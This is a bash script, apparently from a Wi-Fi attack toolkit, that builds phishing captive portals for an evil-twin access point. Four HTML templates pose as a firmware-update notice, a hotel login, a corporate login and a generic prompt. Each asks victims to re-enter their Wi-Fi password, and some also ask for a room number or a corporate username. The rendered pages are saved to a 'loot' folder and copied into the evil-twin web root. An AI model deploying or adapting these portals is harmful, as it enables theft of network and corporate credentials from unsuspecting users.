#!/usr/bin/env bash
# 23_captive_portal_builder.sh — render HTML captive portals
# ── self-locate WIFISTING_ROOT ──
# When launched via pkexec, HOME is /root and any $HOME-relative path
# would land in the wrong place. Resolve WIFISTING_ROOT from this
# script's own path so state / loot / captures always end up in the
# project tree regardless of who runs us.
if [[ -z "${WIFISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    WIFISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export WIFISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

# Under pkexec, HOME=/root even though we're writing to the invoking
# user's tree. WIFISTING_ROOT is <real_home>/wifisting, so its parent
# is the real home. Reset HOME so downstream $HOME-relative defaults
# (LOOT_DIR, CAPTURES_DIR, LOGS_DIR, XDG_CONFIG_HOME, etc.) resolve
# to the user's paths instead of /root.
if [[ -n "${WIFISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$WIFISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi

: "${WIFISTING_HOME:=$WIFISTING_ROOT}"

: "${TMP_DIR:=/tmp/wifisting}"
: "${LOOT_DIR:=$HOME/wifisting/loot}"
: "${LOGS_DIR:=$HOME/wifisting/logs}"
: "${WIFISTING_HOME:=$HOME/wifisting}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$LOGS_DIR" 2>/dev/null

CP_DIR="$TMP_DIR/portal_builder"
CP_TEMPLATES="$CP_DIR/templates"
CP_OUTPUTS="$LOOT_DIR/portals"
CP_ASSETS="$CP_DIR/assets"

mkdir -p "$CP_TEMPLATES" "$CP_OUTPUTS" "$CP_ASSETS"

# ── templates ──
# Each template is a small Jinja-ish source with {{VARS}}.
# Python does the substitution so values with quotes / pipes / < > work.

cp_write_templates() {
    [[ -f "$CP_TEMPLATES/firmware.html"   ]] && \
    [[ -f "$CP_TEMPLATES/hotel.html"      ]] && \
    [[ -f "$CP_TEMPLATES/corporate.html"  ]] && \
    [[ -f "$CP_TEMPLATES/generic.html"    ]] && return 0

    cat > "$CP_TEMPLATES/firmware.html" << 'HTML'
<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'unsafe-inline'; style-src 'unsafe-inline'">
<title>{{TITLE}}</title>
<style>
body{font-family:-apple-system,sans-serif;background:#f4f4f4;margin:0;padding:20px;color:#333}
.box{max-width:420px;margin:40px auto;background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1)}
h1{color:#c00;font-size:20px;margin-top:0}
.warn{background:#fff3cd;border-left:4px solid {{ACCENT}};padding:12px;margin:15px 0;font-size:14px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;font-size:16px}
button{width:100%;padding:12px;background:{{ACCENT}};color:#fff;border:0;border-radius:4px;font-size:16px;cursor:pointer}
button:hover{opacity:.9}
.small{font-size:12px;color:#666;margin-top:15px;text-align:center}
</style></head><body>
<div class="box">
<h1>{{HEADING}}</h1>
<div class="warn">{{MESSAGE}}</div>
<form method="POST" action="{{SUBMIT_URL}}">
<label>Network: <b>{{SSID}}</b></label>
<input type="password" name="pw" placeholder="Wi-Fi Password" required minlength="8">
<button type="submit">{{BUTTON}}</button>
</form>
<div class="small">{{FOOTER}}</div>
</div></body></html>
HTML

    cat > "$CP_TEMPLATES/hotel.html" << 'HTML'
<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'unsafe-inline'; style-src 'unsafe-inline'">
<title>{{TITLE}}</title>
<style>
body{font-family:-apple-system,sans-serif;background:#1a1a1a;margin:0;padding:20px;color:#eee}
.box{max-width:380px;margin:60px auto;background:#242424;padding:30px;border-radius:12px}
h1{font-size:22px;margin-top:0;color:{{ACCENT}}}
.sub{color:#999;font-size:14px;margin-bottom:20px}
label{display:block;font-size:13px;color:#ccc;margin:14px 0 4px}
input{width:100%;padding:12px;background:#1a1a1a;color:#eee;border:1px solid #333;border-radius:6px;box-sizing:border-box;font-size:15px}
input:focus{border-color:{{ACCENT}};outline:none}
button{width:100%;padding:13px;background:{{ACCENT}};color:#111;border:0;border-radius:6px;font-size:15px;font-weight:bold;cursor:pointer;margin-top:16px}
button:hover{opacity:.9}
small{display:block;text-align:center;color:#666;font-size:11px;margin-top:20px}
</style></head><body>
<div class="box">
<h1>{{HEADING}}</h1>
<div class="sub">{{MESSAGE}}</div>
<form method="POST" action="{{SUBMIT_URL}}">
<label>Room number</label>
<input type="text" name="room" placeholder="e.g. 412">
<label>Wi-Fi password for "{{SSID}}"</label>
<input type="password" name="pw" placeholder="Password" required>
<button type="submit">{{BUTTON}}</button>
</form>
<small>{{FOOTER}}</small>
</div></body></html>
HTML

    cat > "$CP_TEMPLATES/corporate.html" << 'HTML'
<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'unsafe-inline'; style-src 'unsafe-inline'">
<title>{{TITLE}}</title>
<style>
body{font-family:-apple-system,sans-serif;background:#f9fafb;margin:0;padding:20px;color:#111}
.box{max-width:400px;margin:60px auto;background:#fff;padding:34px;border-radius:4px;border:1px solid #e5e7eb;box-shadow:0 1px 3px rgba(0,0,0,.05)}
h1{font-size:19px;margin:0 0 6px;font-weight:600}
p{color:#4b5563;font-size:14px;line-height:1.5;margin:14px 0}
label{display:block;font-size:12px;color:#374151;font-weight:500;margin:14px 0 4px}
input{width:100%;padding:10px;border:1px solid #d1d5db;border-radius:4px;box-sizing:border-box;font-size:14px;font-family:inherit}
input:focus{border-color:{{ACCENT}};outline:none;box-shadow:0 0 0 3px rgba(59,130,246,.1)}
button{width:100%;padding:11px;background:{{ACCENT}};color:#fff;border:0;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;margin-top:18px}
button:hover{opacity:.95}
.footer{border-top:1px solid #e5e7eb;margin-top:22px;padding-top:14px;font-size:11px;color:#6b7280;text-align:center}
</style></head><body>
<div class="box">
<h1>{{HEADING}}</h1>
<p>{{MESSAGE}}</p>
<form method="POST" action="{{SUBMIT_URL}}">
<label>Corporate username</label>
<input type="text" name="user" placeholder="firstname.lastname" required>
<label>Password for {{SSID}}</label>
<input type="password" name="pw" placeholder="Password" required>
<button type="submit">{{BUTTON}}</button>
</form>
<div class="footer">{{FOOTER}}</div>
</div></body></html>
HTML

    cat > "$CP_TEMPLATES/generic.html" << 'HTML'
<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'unsafe-inline'; style-src 'unsafe-inline'">
<title>{{TITLE}}</title>
<style>
body{font-family:sans-serif;background:#f4f4f4;margin:0;padding:20px;color:#333}
.box{max-width:400px;margin:40px auto;background:#fff;padding:30px;border-radius:8px}
h1{margin-top:0}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;font-size:15px}
button{width:100%;padding:12px;background:{{ACCENT}};color:#fff;border:0;border-radius:4px;font-size:15px;cursor:pointer}
button:hover{opacity:.9}
</style></head><body>
<div class="box">
<h1>{{HEADING}}</h1>
<p>{{MESSAGE}}</p>
<form method="POST" action="{{SUBMIT_URL}}">
<input type="password" name="pw" placeholder="Password for {{SSID}}" required>
<button type="submit">{{BUTTON}}</button>
</form>
<p style="font-size:12px;color:#666;text-align:center;margin-top:15px">{{FOOTER}}</p>
</div></body></html>
HTML
}

# ── listing ──

cp_list_templates_tsv() {
    cp_write_templates
    local f
    for f in "$CP_TEMPLATES"/*.html; do
        [[ -e "$f" ]] || continue
        printf '%s\t%s\n' "$(basename "$f" .html)" "$(stat -c%s "$f")"
    done
}

cp_list_portals_tsv() {
    local d
    for d in "$CP_OUTPUTS"/*/; do
        [[ -d "$d" ]] || continue
        local name
        name=$(basename "$d")
        local idx="$d/index.html"
        local sz=0
        [[ -f "$idx" ]] && sz=$(stat -c%s "$idx")
        printf '%s\t%s\t%s\n' "$name" "$sz" "$d"
    done
}

# ── render via Python (no more sed pipe-char breakage) ──
cp_render_portal() {
    local tmpl="$1" name="$2" heading="$3" message="$4" \
          ssid="$5" accent="$6" button="$7" footer="$8" submit_url="$9"

    [[ -z "$tmpl" ]] && { printf 'ERROR\ttemplate required\n' >&2; return 1; }
    [[ -z "$name" ]] && name="portal_$(date +%s)"

    local tpath="$CP_TEMPLATES/$tmpl.html"
    [[ ! -f "$tpath" ]] && { printf 'ERROR\tno such template: %s\n' "$tmpl" >&2; return 1; }

    # defaults
    [[ -z "$heading"    ]] && heading="Network Access Required"
    [[ -z "$message"    ]] && message="Please re-enter your Wi-Fi password to continue."
    [[ -z "$ssid"       ]] && ssid="Free-WiFi"
    [[ -z "$accent"     ]] && accent="#c00"
    [[ -z "$button"     ]] && button="Continue"
    [[ -z "$footer"     ]] && footer="© 2026"
    [[ -z "$submit_url" ]] && submit_url="/submit.cgi"

    local outdir="$CP_OUTPUTS/$name"
    mkdir -p "$outdir"

    # FIXED: Python does the substitution, so values with | & < > " ' \ work
    python3 - "$tpath" "$outdir/index.html" \
        "TITLE=$heading" \
        "HEADING=$heading" \
        "MESSAGE=$message" \
        "SSID=$ssid" \
        "ACCENT=$accent" \
        "BUTTON=$button" \
        "FOOTER=$footer" \
        "SUBMIT_URL=$submit_url" << 'PYEOF'
import sys
src, dst = sys.argv[1], sys.argv[2]
vars_ = {}
for kv in sys.argv[3:]:
    k, v = kv.split("=", 1)
    vars_[k] = v

with open(src, "r", encoding="utf-8") as f:
    body = f.read()

for k, v in vars_.items():
    body = body.replace("{{" + k + "}}", v)

with open(dst, "w", encoding="utf-8") as f:
    f.write(body)
PYEOF

    if [[ ! -s "$outdir/index.html" ]]; then
        printf 'ERROR\trender produced empty file\n' >&2
        return 1
    fi

    # Optional custom submit.cgi — reuse from evil twin if present
    if [[ -f "/tmp/wifisting/eviltwin/www/submit.cgi" ]]; then
        cp "/tmp/wifisting/eviltwin/www/submit.cgi" "$outdir/submit.cgi"
        chmod +x "$outdir/submit.cgi"
    fi

    # Copy any assets the user dropped in $CP_ASSETS
    if [[ -d "$CP_ASSETS" && -n "$(ls -A "$CP_ASSETS" 2>/dev/null)" ]]; then
        cp -r "$CP_ASSETS"/* "$outdir/" 2>/dev/null || true
    fi

    printf 'RENDERED\t%s\n' "$outdir"
    printf 'SIZE\t%s\n' "$(stat -c%s "$outdir/index.html")"
}

cp_delete_portal() {
    local name="$1"
    [[ -z "$name" ]] && { printf 'ERROR\tmissing name\n' >&2; return 1; }
    # A portal name is a single path component. The old regex allowed "." and
    # "..", so `rm` refused but the function still printed DELETED with rc 0.
    case "$name" in
        .|..) printf 'ERROR\tinvalid name (dot path): %s\n' "$name" >&2; return 1 ;;
    esac
    # Any path separator is refused: this must never reach outside CP_OUTPUTS.
    [[ "$name" == */* ]] && { printf 'ERROR\tinvalid name (separator): %s\n' "$name" >&2; return 1; }
    [[ "$name" =~ ^[a-zA-Z0-9_.-]+$ ]] || { printf 'ERROR\tinvalid name\n' >&2; return 1; }
    # Never print DELETED for a delete that did not happen.
    rm -rf "${CP_OUTPUTS:?}/$name" || {
        printf 'ERROR\tcould not delete %s\n' "$name" >&2; return 1; }
    printf 'DELETED\t%s\n' "$name"
}

cp_install_to_eviltwin() {
    local name="$1"
    [[ -z "$name" ]] && { printf 'ERROR\tmissing name\n' >&2; return 1; }
    local src="$CP_OUTPUTS/$name"
    [[ ! -d "$src" ]] && { printf 'ERROR\tportal not found\n' >&2; return 1; }

    local et_www="/tmp/wifisting/eviltwin/www"
    mkdir -p "$et_www"

    cp -a "$src"/* "$et_www/"
    [[ -f "$src/submit.cgi" ]] && chmod +x "$et_www/submit.cgi"

    printf 'INSTALLED\t%s\n' "$et_www"
}

cp_status_tsv() {
    cp_write_templates
    local templates=0 outputs=0
    templates=$(find "$CP_TEMPLATES" -maxdepth 1 -name '*.html' 2>/dev/null | wc -l)
    outputs=$(find "$CP_OUTPUTS" -maxdepth 1 -mindepth 1 -type d 2>/dev/null | wc -l)
    printf 'templates\t%s\n' "$templates"
    printf 'portals\t%s\n' "$outputs"
    printf 'templates_dir\t%s\n' "$CP_TEMPLATES"
    printf 'outputs_dir\t%s\n' "$CP_OUTPUTS"
    printf 'assets_dir\t%s\n' "$CP_ASSETS"
    printf 'eviltwin_www\t%s\n' "/tmp/wifisting/eviltwin/www"
}

# ── self-test ────────────────────────────────────────────────────────────
# Offline only: no radio, no root, no network. Templates, rendered portals
# and assets are shadowed into a scratch dir under $CP_DIR and removed
# before returning; loot/portals and /tmp/wifisting/eviltwin are untouched.
cp_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad+1)); fi
    }

    local st="$CP_DIR/selftest-$$"
    rm -rf "$st"; mkdir -p "$st/templates" "$st/portals" "$st/assets"
    local CP_TEMPLATES="$st/templates" CP_OUTPUTS="$st/portals" CP_ASSETS="$st/assets"
    local field
    field() { awk -F'\t' -v k="$1" '$1==k{print $2}'; }

    # ── built-in templates ──
    cp_write_templates
    chk templates-names "$(cp_list_templates_tsv | cut -f1 | paste -sd, -)" \
        "corporate,firmware,generic,hotel"
    chk templates-nonempty "$(cp_list_templates_tsv | awk -F'\t' '$2>0' | wc -l)" "4"

    # ── render: values that used to break the sed pipeline must survive ──
    local h='Update | Required'
    local m='Price $100 `tick` "quoted" & <tagged> \ backslash'
    local s="O'Brien <Wi-Fi> & Co"
    local a='#0a0'
    local b='Go > Now'
    local f='© 2026'
    local u='/submit.cgi?x=1&y=2'
    local out; out=$(cp_render_portal generic selftest "$h" "$m" "$s" "$a" "$b" "$f" "$u")
    local idx="$CP_OUTPUTS/selftest/index.html"
    chk render-path "$(printf '%s\n' "$out" | field RENDERED)" "$CP_OUTPUTS/selftest"
    chk render-size-matches "$(printf '%s\n' "$out" | field SIZE)" "$(stat -c%s "$idx")"
    chk render-heading  "$(grep -cF "<h1>$h</h1>" "$idx")" "1"
    chk render-title    "$(grep -cF "<title>$h</title>" "$idx")" "1"
    chk render-message  "$(grep -cF "$m" "$idx")" "1"
    chk render-ssid     "$(grep -cF "$s" "$idx")" "1"
    chk render-button   "$(grep -cF "$b" "$idx")" "1"
    chk render-accent   "$(grep -cF "$a" "$idx")" "1"
    chk render-footer   "$(grep -cF "$f" "$idx")" "1"
    chk render-action   "$(grep -cF "action=\"$u\"" "$idx")" "1"
    # No {{VAR}} may survive a render.
    chk render-no-placeholders "$(grep -c '{{' "$idx")" "0"

    # ── render rejections ──
    cp_render_portal "" name x y z q r t >/dev/null 2>&1
    chk render-no-template-rc "$?" "1"
    cp_render_portal nosuchtemplate name x y z q r t >/dev/null 2>&1
    chk render-unknown-template-rc "$?" "1"

    # ── portal inventory ──
    rm -rf "$CP_OUTPUTS/selftest"
    mkdir -p "$CP_OUTPUTS/alpha" "$CP_OUTPUTS/beta"
    printf 'hello' > "$CP_OUTPUTS/alpha/index.html"
    chk list-portals "$(cp_list_portals_tsv)" \
        "$(printf '%s\n' "alpha	5	$CP_OUTPUTS/alpha/" "beta	0	$CP_OUTPUTS/beta/")"
    local stsv; stsv=$(cp_status_tsv)
    fld() { printf '%s\n' "$stsv" | awk -F'\t' -v k="$1" '$1==k{print $2}'; }
    chk status-templates "$(fld templates)"    "4"
    chk status-portals   "$(fld portals)"      "2"
    chk status-tpl-dir   "$(fld templates_dir)" "$CP_TEMPLATES"
    chk status-out-dir   "$(fld outputs_dir)"  "$CP_OUTPUTS"
    chk status-assets    "$(fld assets_dir)"   "$CP_ASSETS"

    # ── delete: names with a path separator are refused ──
    cp_delete_portal "../../etc" >/dev/null 2>&1
    chk delete-traversal-rc "$?" "1"
    cp_delete_portal "a/b" >/dev/null 2>&1
    chk delete-slash-rc "$?" "1"
    cp_delete_portal "" >/dev/null 2>&1
    chk delete-empty-rc "$?" "1"
    # ".." is now refused by NAME: no DELETED line, non-zero exit, and
    # nothing above the outputs dir is removed.
    out=$(cp_delete_portal ".." 2>&1); rc=$?
    chk delete-dotdot-rc       "$rc" "1"
    chk delete-dotdot-nodelete "$(printf '%s\n' "$out" | grep -c '^DELETED')" "0"
    chk delete-dotdot-named    "$(printf '%s\n' "$out" | grep -c '^ERROR.*invalid name (dot path): \.\.$')" "1"
    chk delete-dotdot-no-harm "$([[ -d "$st" && -d "$CP_OUTPUTS" ]] && echo intact || echo gone)" "intact"
    out=$(cp_delete_portal "." 2>&1); rc=$?
    chk delete-dot-rc       "$rc" "1"
    chk delete-dot-nodelete "$(printf '%s\n' "$out" | grep -c '^DELETED')" "0"
    out=$(cp_delete_portal "a/../b" 2>&1); rc=$?
    chk delete-inner-sep-rc       "$rc" "1"
    chk delete-inner-sep-nodelete "$(printf '%s\n' "$out" | grep -c '^DELETED')" "0"
    chk delete-inner-sep-named    "$(printf '%s\n' "$out" | grep -c '^ERROR.*invalid name (separator)')" "1"
    mkdir -p "$CP_OUTPUTS/gone"
    chk delete-ok "$(cp_delete_portal gone)" $'DELETED\tgone'
    chk delete-removed "$([[ -d "$CP_OUTPUTS/gone" ]] && echo yes || echo no)" "no"
    # A failing `rm` must not be reported as a successful delete. Stub `rm`
    # so this works regardless of the uid the selftest runs as.
    mkdir -p "$CP_OUTPUTS/keeper" "$st/rmstub"
    printf '#!/bin/sh\nexit 1\n' > "$st/rmstub/rm"
    chmod +x "$st/rmstub/rm"
    local s_path="$PATH"
    PATH="$st/rmstub:$PATH"
    out=$(cp_delete_portal keeper 2>&1); rc=$?
    PATH="$s_path"
    chk delete-rmfail-rc       "$rc" "1"
    chk delete-rmfail-nodelete "$(printf '%s\n' "$out" | grep -c '^DELETED')" "0"
    chk delete-rmfail-named    "$(printf '%s\n' "$out" | grep -c '^ERROR.*could not delete keeper$')" "1"
    chk delete-rmfail-intact   "$([[ -d "$CP_OUTPUTS/keeper" ]] && echo present || echo gone)" "present"
    chk delete-real-after-stub "$(cp_delete_portal keeper)" $'DELETED\tkeeper'

    # ── install into evil twin: nothing to install is an error ──
    cp_install_to_eviltwin "" >/dev/null 2>&1
    chk install-missing-name-rc "$?" "1"
    cp_install_to_eviltwin no-such-portal >/dev/null 2>&1
    chk install-unknown-portal-rc "$?" "1"

    rm -rf "$st"
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

cp_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)         cp_status_tsv ;;
        --list-templates-tsv) cp_list_templates_tsv ;;
        --list-portals-tsv)   cp_list_portals_tsv ;;
        --render)             cp_render_portal "$@" ;;
        --delete)             cp_delete_portal "$@" ;;
        --install)            cp_install_to_eviltwin "$@" ;;
        --selftest)           cp_selftest ;;
        *)
            cat >&2 <<EOF
Usage: $0 COMMAND
  --status-tsv
  --list-templates-tsv
  --list-portals-tsv
  --render TEMPLATE NAME HEADING MESSAGE SSID ACCENT BUTTON FOOTER SUBMIT_URL
  --delete NAME
  --install NAME
  --selftest
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    WIFISTING_CLI=1
    declare -F info >/dev/null 2>&1 || info() { printf '[info] %s\n' "$*" >&2; }
    command -v err  >/dev/null 2>&1 || err()  { printf '[err]  %s\n' "$*" >&2; }
    cp_cli_main "$@"
fi
